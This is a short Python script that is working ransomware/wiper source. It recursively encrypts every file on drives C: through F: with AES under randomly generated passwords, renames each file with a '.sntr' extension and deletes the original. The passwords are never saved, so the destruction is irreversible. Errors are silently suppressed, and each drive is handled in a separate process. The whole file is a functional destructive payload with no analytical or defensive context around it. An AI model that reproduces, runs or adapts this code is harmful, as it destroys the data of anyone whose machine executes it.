import random
import os
import threading
from multiprocessing import Process

import pyAesCrypt


dir_c = 'C:/'
dir_d = 'D:/'
dir_e = 'E:/'
dir_f = 'F:/'

chars = '+-/*!@#$&=<>abcdifghijklmnopqrstuvwxyzABCDIFGHIJKLMNOPQRSTUVWXYZ1234567890'


def generate_pass():
    password = ''
    for i in range(128):
        password += random.choice(chars)
    return password

def crypt_file(file, password):
    try:
        bufferSize = 512 * 1024
        pyAesCrypt.encryptFile(str(file), str(file) + ".sntr",
                               password, bufferSize)
        os.remove(file)
    except:
        pass

def crypt_disk(dir, password):
    try:
        for file in os.listdir(dir):
            if os.path.isdir(dir + '\\' + file):
                crypt_disk(dir + '\\' + file, password)
            if os.path.isfile(dir + '\\' + file):
                try:
                    crypt_file(dir + '\\' + file, password)
                except:
                    pass
    except OSError:
        pass

#def crypting(dir, password):
    #pycrypt = threading.Thread(target=crypt_disk, args=(dir, password))
    #pycrypt.start()

def crypting(dir, password):
    pycrypt = Process(target=crypt_disk, args=(dir, password))
    pycrypt.start()


try:
    crypting(dir_c, password=generate_pass())
    crypting(dir_d, password=generate_pass())
    crypting(dir_e, password=generate_pass())
    crypting(dir_f, password=generate_pass())
    #crypt_disk(dir_e, password=generate_pass()) # запускаем без потоков и процессов
    #crypt_disk(dir_f, password=generate_pass()) # диски будут шифроваться по очереди
except Exception as e:
    pass
